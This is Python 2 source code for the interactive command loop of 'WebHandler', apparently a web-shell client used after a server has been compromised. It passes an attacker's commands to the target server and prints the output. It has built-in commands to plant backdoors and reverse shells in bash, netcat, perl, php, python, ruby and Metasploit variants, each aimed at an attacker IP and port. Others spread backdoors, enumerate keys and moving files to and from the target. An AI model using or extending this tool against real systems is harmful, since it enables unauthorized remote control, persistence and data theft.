from urllib import unquote
from subprocess import Popen
from os import getcwd
try:
    import readline
except ImportError:
    print '\n[!] The "readline" module is required to provide elaborate line editing and history features'
else:
    pass

from core.libs.menu import Colors, banner
from core.libs.update import update
from core.libs.request_handler import make_request
from core.modules.info import info
from core.modules.backdoor import backdoor
from core.modules.file_handler import file_handler
from core.modules.enumerate import enumerate


class Commander(object):
    '''
    Class to execute commands on the target
    '''
    def BackConnect(self):
        self.cwd = info.cwd
        i = 1
        # Empty list to save attacker's pushed commands
        history = []
        while True:
            try:
                try:
                    # Getting command to be executed from the user
                    command = raw_input('{user}{red}@{end}{green}{host_ip}{end}:~{yellow}({cwd}){end}-$ '.format(user=info.current_user,
                        red=Colors.RED, green=Colors.GREEN, yellow=Colors.YELLOW, end=Colors.END,
                        host_ip=info.host_ip.split(',')[0],
                        cwd=self.cwd))
                # If something went wrong screw the list
                except IndexError:
                    command = raw_input('WebHandler@server:$ ')

                history.append(unquote(command))
                if command not in ['exit', 'quit', 'bye']:
                    if command == 'clear':
                        import platform
                        os = platform.platform()
                        if "windows" in os.lower():
                            Popen('cls', shell=True).wait()
                        else:
                            Popen('clear', shell=True).wait()

                    # Getting all commands attackr's did on the server
                    elif command == '@history':
                        x = 1
                        for command in history:
                            print '{0:2d} {1}'.format(x, command)
                            x += 1

                    # Execute the command on the attacker's box if '!' provided at the first of the command
                    elif command.startswith('!'):
                        Popen(command[1:], shell=True).wait()

                    # Get stored info from
                    elif command == '@info':
                        info.get_information()

                    # Update WebHandler
                    elif command == '@update':
                        update()

                    # Get WebHandler banner
                    elif command == '@banner':
                        print banner

                    elif command.startswith('@backdoor'):
                        if len(command.split()) == 3:
                            ip = command.split()[2].split(':')[0]
                            port = command.split()[2].split(':')[1]
                            if command.split()[1] == "bash":
                                backdoor.bash(ip, port)
                            elif command.split()[1] == "java":
                                backdoor.java(ip, port)
                            elif command.split()[1] == "msf":
                                backdoor.msf(ip, port)
                            elif command.split()[1] == "netcat":
                                backdoor.netcat(ip, port)
                            elif command.split()[1] == "perl":
                                backdoor.perl(ip, port)
                            elif command.split()[1] == "php":
                                backdoor.php(ip, port)
                            elif command.split()[1] == "python":
                                backdoor.python(ip, port)
                            elif command.split()[1] == "ruby":
                                backdoor.ruby(ip, port)
                            elif command.split()[1] == "xterm":
                                backdoor.xterm(ip)
                            else:
                                backdoor.list()
                        elif len(command.split()) == 2:
                            if command.split()[1] == "spread":
                                backdoor.spread()
                            else:
                                backdoor.list()
                        else:
                            backdoor.list()

                    elif command.startswith('@enum'):
                        if len(command.split()) == 2:
                            if command.split()[1] == "health":
                                enumerate.health()
                            elif command.split()[1] == "history":
                                enumerate.history()
                            elif command.split()[1] == "ip":
                                enumerate.ip()
                            elif command.split()[1] == "os":
                                enumerate.os()
                            elif command.split()[1] == "keys":
                                enumerate.keys()
                            elif command.split()[1] == "writable":
                                enumerate.writable()
                            else:
                                enumerate.list()
                        else:
                            enumerate.list()

                    elif command.startswith('@download'):
                        if len(command.split()) < 2:
                            print '\n{0}[!] Usage: @download [remote_file_path] <local_file_path>{1}'.format(Colors.RED, Colors.END)
                        else:
                            rfile_path = command.split()[1]
                            if len(command.split()) == 2:
                                lfile_path = '{0}/{1}'.format(getcwd(), rfile_path.split('/')[-1])
                            else:
                                lfile_path = command.split()[2]
                                file_handler.download_file(rfile_path, lfile_path)

                    elif command.startswith('@upload'):
                        if len(command.split()) != 3:
                            print '\n{0}[!] Usage: @upload [local_file_path] [remote_file_path]{1}'.format(Colors.RED, Colors.END)
                        else:
                            lfile_path = command.split()[1]
                            rfile_path = command.split()[2]
                            file_handler.upload_file(lfile_path, rfile_path)

                    else:
                        try:
                            if command.split()[0] == 'cd' and len(command.split()) > 1:
                                cwd = self.cwd
                                if '../' in command.split()[-1] or '..' in command.split()[-1]:
                                    self.cwd = cwd.rstrip(cwd.split('/').pop()).rstrip('/')
                                else:
                                    if command.split()[-1].startswith('/'):
                                        cmd = '[ -d {0} ] && echo is_valid'.format(command.split()[-1])
                                        if make_request.get_page_source(cmd)[0] == 'is_valid':
                                            self.cwd = command.split()[-1]
                                        else:
                                            print 'bash: cd: {0}: No such file or directory'.format(command.split()[-1])
                                    else:
                                        cmd = '[ -d {0}/{1} ] && echo is_valid'.format(cwd, command.split()[-1])
                                        if make_request.get_page_source(cmd)[0] == 'is_valid':
                                            self.cwd = '{0}/{1}'.format(cwd, command.split()[-1])
                                        else:
                                            print 'bash: cd: {0}: No such file or directory'.format(command.split()[-1])

                            elif command.split()[0] == 'cd' and len(command.split()) == 1:
                                self.cwd = info.cwd  # dirty patch

                            else:
                                # Setting aliases for some commands to avoid
                                # Issues realted to empty directories
                                command = command.replace('ls', 'ls -lha') if command.split()[0] == 'ls' else command
                                command = command.replace('rm', 'rm -v') if command.split()[0] == 'rm' else command
                                command = command.replace('cp', 'cp -v') if command.split()[0] == 'cp' else command
                                command = command.replace('ifconfig', '/sbin/ifconfig')

                                cmd = 'cd {0};{1}'.format(self.cwd, command)

                                # Get the source code cotenets
                                source = make_request.get_page_source(cmd)
                                if source:
                                    for line in source:
                                        print line

                                # If the executed command doesn't exist
                                else:
                                    errmsg = '{0}: command not found'.format(unquote(command))
                                    if command.split()[0] == 'echo':
                                        pass
                                    else:
                                        print errmsg
                        except IndexError:
                            pass

                # Exit WebHandler if user provides exit as a command
                else:
                    print '\n[+] Preformed "{0}" commands on the server, {1}\n[*] Connection closed'.format(i, info.host_ip.split(',')[0])
                    break

            # If recieved a break (^c)... Do nothing!
            except KeyboardInterrupt:
                print ""
            i += 1

# Taking an instance from the main class
commander = Commander()
